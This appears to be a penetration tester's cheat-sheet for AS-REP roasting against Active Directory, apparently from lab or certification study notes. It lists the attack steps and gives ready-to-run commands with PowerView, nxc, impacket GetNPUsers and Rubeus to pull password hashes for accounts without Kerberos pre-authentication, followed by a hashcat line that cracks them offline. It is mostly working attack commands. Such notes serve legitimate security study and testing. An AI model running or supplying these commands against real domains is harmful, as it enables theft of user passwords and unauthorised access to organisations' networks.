

Attack against users with **"Do not require Kerberos pre-authentication"** enabled that Allows you to request TGT without knowing the password we can  crack hash for offline cracking

Steps:
- Find users with pre-auth disabled
- Request TGT for that user (no password needed)
- Receive encrypted TGT that's encrypted with user's password
- Crack the TGT encryption offline

**NOTE** we cant pass this hash if we cant crack it its a deadEND


```sh

#powerview
Get-DomainUser -PreauthNotRequired -verbose

#nxc
nxc ldap 192.168.0.104 -u user.txt -p '' --asreproast output.txt

#impacket 
GetNPUsers.py -dc-ip 10.129.40.182  -usersfile ./valid -no-pass  EGOTISTICAL-BANK.LOCAL/


impacket-getnpusers oscp.lab/wade

# check ASREPRoast for all users in current domain
.\Rubeus.exe asreproast /outfile:<Out>
```

Cracking with dictionary of hash to recover the password :

```sh
hashcat -m 18200 -a 0 <AS_Response_Hash> <wordlist> --force
```


**note**

we can use PowerView's _Get-DomainUser_ function with the option **-PreauthNotRequired** on Windows
